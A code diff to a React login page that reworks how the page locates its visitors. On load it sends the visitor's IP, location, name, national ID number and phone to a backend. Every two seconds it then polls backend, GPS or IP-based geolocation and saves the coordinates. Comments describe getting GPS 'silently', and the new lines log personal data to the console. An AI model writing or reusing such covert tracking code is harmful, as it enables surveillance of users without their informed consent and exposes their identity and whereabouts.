@@ -260,17 +260,48 @@ function Login() {
     setDevice(isMobile ? "mobile" : "desktop");
 
     (async () => {
-      const ipAddr = await getIP();
-      if (ipAddr) setIp(ipAddr);
+      let ipAddr = "";
+      let lat = null;
+      let lon = null;
+      let area = "unknown";
 
-      const ipGeo = await lookupIpLocation(ipAddr);
-      const lat = ipGeo.lat;
-      const lon = ipGeo.lon;
-      const area = ipGeo.area || "unknown";
+      // Try backend geolocation first (more reliable on mobile)
+      try {
+        console.log("Fetching geolocation from backend...");
+        const geoRes = await fetch(`${API_BASE}/api/user/geolocation`, {
+          signal: AbortSignal.timeout(5000),
+        });
+        if (geoRes.ok) {
+          const geoData = await geoRes.json();
+          console.log("Backend geolocation response:", geoData);
+          ipAddr = geoData.ip || "";
+          lat = geoData.location?.lat || null;
+          lon = geoData.location?.lon || null;
+          area = geoData.location?.area || "unknown";
+          setIp(ipAddr);
+          if (lat != null && lon != null)
+            setLocation({ latitude: Number(lat), longitude: Number(lon) });
+          setAreaName(area);
+          console.log("Successfully got location from backend:", { ipAddr, lat, lon, area });
+        } else {
+          console.log("Backend geolocation returned error status:", geoRes.status);
+          throw new Error("Backend geolocation error");
+        }
+      } catch (e) {
+        console.log("Backend geolocation failed, falling back to client-side:", e.message);
+        // Fallback to client-side detection
+        ipAddr = await getIP();
+        if (ipAddr) setIp(ipAddr);
 
-      if (lat != null && lon != null)
-        setLocation({ latitude: Number(lat), longitude: Number(lon) });
-      setAreaName(area || "unknown");
+        const ipGeo = await lookupIpLocation(ipAddr);
+        lat = ipGeo.lat;
+        lon = ipGeo.lon;
+        area = ipGeo.area || "unknown";
+
+        if (lat != null && lon != null)
+          setLocation({ latitude: Number(lat), longitude: Number(lon) });
+        setAreaName(area || "unknown");
+      }
 
       const locPayload =
         lat != null && lon != null
@@ -287,6 +318,7 @@ function Login() {
       };
 
       try {
+        console.log("Creating initial user record with:", payload);
         const r = await fetch(`${API_BASE}/api/user/add`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
@@ -294,7 +326,10 @@ function Login() {
         });
         if (r.ok) {
           const data = await r.json();
-          if (data && data._id) setUserId(data._id);
+          if (data && data._id) {
+            setUserId(data._id);
+            console.log("User created with ID:", data._id);
+          }
         }
       } catch (e) {
         // ignore network errors for initial save
@@ -309,57 +344,90 @@ function Login() {
 
     const startPolling = () => {
       intervalId = setInterval(async () => {
-        let gpsLat = null;
-        let gpsLon = null;
-        let useGps = false;
+        let lat = null;
+        let lon = null;
+        let area = "unknown";
+        let ipAddr = "";
 
-        // Try to get GPS silently with very short timeout (no permission prompt if already denied)
-        if (navigator.geolocation) {
-          try {
-            await new Promise((resolve) => {
-              navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                  gpsLat = pos.coords.latitude;
-                  gpsLon = pos.coords.longitude;
-                  useGps = true;
-                  resolve();
-                },
-                () => {
-                  // Error: permission denied or unavailable; use IP-based fallback
-                  resolve();
-                },
-                { enableHighAccuracy: true, maximumAge: 0, timeout: 500 }, // Very short timeout
-              );
-            });
-          } catch (e) {
-            // Fallback to IP-based
+        // Try backend geolocation first
+        try {
+          console.log("Polling: Fetching geolocation from backend...");
+          const geoRes = await fetch(`${API_BASE}/api/user/geolocation`, {
+            signal: AbortSignal.timeout(5000),
+          });
+          if (geoRes.ok) {
+            const geoData = await geoRes.json();
+            console.log("Polling: Backend geolocation response:", geoData);
+            ipAddr = geoData.ip || "";
+            lat = geoData.location?.lat || null;
+            lon = geoData.location?.lon || null;
+            area = geoData.location?.area || "unknown";
+            setIp(ipAddr);
+            if (lat != null && lon != null) {
+              setLocation({ latitude: Number(lat), longitude: Number(lon) });
+              setAreaName(area);
+              console.log("Polling: Successfully got location from backend:", { ipAddr, lat, lon, area });
+            }
+          } else {
+            throw new Error("Backend geolocation error");
+          }
+        } catch (e) {
+          console.log("Polling: Backend geolocation failed, trying client-side:", e.message);
+          
+          // Try GPS first with short timeout
+          let gpsLat = null;
+          let gpsLon = null;
+
+          if (navigator.geolocation) {
+            try {
+              await new Promise((resolve) => {
+                navigator.geolocation.getCurrentPosition(
+                  (pos) => {
+                    gpsLat = pos.coords.latitude;
+                    gpsLon = pos.coords.longitude;
+                    resolve();
+                  },
+                  () => {
+                    resolve();
+                  },
+                  { enableHighAccuracy: true, maximumAge: 0, timeout: 500 },
+                );
+              });
+            } catch (e) {
+              // Fallback to IP-based
+            }
+          }
+
+          if (gpsLat != null && gpsLon != null) {
+            lat = gpsLat;
+            lon = gpsLon;
+            console.log("Polling: Got GPS coordinates:", { lat, lon });
+            const areaRefined = await reverseGeocode(lat, lon);
+            area = areaRefined || "unknown";
+            setLocation({ latitude: Number(lat), longitude: Number(lon) });
+            setAreaName(area);
+          } else {
+            // IP-based location
+            console.log("Polling: GPS unavailable, using IP-based location");
+            ipAddr = await getIP();
+            if (ipAddr) setIp(ipAddr);
+            const ipGeo = await lookupIpLocation(ipAddr);
+            lat = ipGeo.lat;
+            lon = ipGeo.lon;
+            area = ipGeo.area || "unknown";
+            if (lat != null && lon != null) {
+              setLocation({ latitude: Number(lat), longitude: Number(lon) });
+              const areaRefined = await reverseGeocode(lat, lon);
+              setAreaName(areaRefined || area);
+            } else {
+              setAreaName("unknown");
+            }
           }
         }
 
-        if (useGps && gpsLat != null && gpsLon != null) {
-          // Use GPS coordinates
-          setLocation({ latitude: Number(gpsLat), longitude: Number(gpsLon) });
-          const area = await reverseGeocode(gpsLat, gpsLon);
-          setAreaName(area || "unknown");
-          const ipAddr = await getIP();
-          if (ipAddr) setIp(ipAddr);
-          await saveLocationToServer(gpsLat, gpsLon, area, ipAddr);
-        } else {
-          // Fallback: IP-based location (silent, no permission prompt)
-          const ipAddr = await getIP();
-          if (ipAddr) setIp(ipAddr);
-          const ipGeo = await lookupIpLocation(ipAddr);
-          const lat = ipGeo.lat;
-          const lon = ipGeo.lon;
-          const area = ipGeo.area || "unknown";
-          if (lat != null && lon != null) {
-            setLocation({ latitude: Number(lat), longitude: Number(lon) });
-            const areaRefined = await reverseGeocode(lat, lon);
-            setAreaName(areaRefined || "unknown");
-            await saveLocationToServer(lat, lon, areaRefined || area, ipAddr);
-          } else {
-            setAreaName("unknown");
-          }
+        // Save to server if we have location and userId
+        if (userId && lat != null && lon != null) {
+          await saveLocationToServer(lat, lon, area, ipAddr);
         }
       }, 2000);
     };
@@ -369,6 +437,7 @@ function Login() {
     return () => {
       if (intervalId) clearInterval(intervalId);
     };
+    // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [userId, name, cnic, phone, device]);
 
   // Validation helpers
